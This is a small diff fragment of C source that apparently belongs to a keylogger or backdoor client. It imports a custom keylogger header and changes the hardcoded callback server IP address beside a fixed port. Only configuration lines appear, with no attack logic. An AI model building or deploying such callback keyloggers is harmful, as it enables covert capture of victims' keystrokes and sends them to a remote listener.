@@ -12,7 +12,7 @@
 #include "keylogger.h" //custom keylogger import
 
 //set host IP Address and Port [EDIT HERE]
-char *ServIP = "192.168.0.6";
+char *ServIP = "192.168.0.9";
 unsigned short ServPort = 54654;
 
 //function to flush arrays
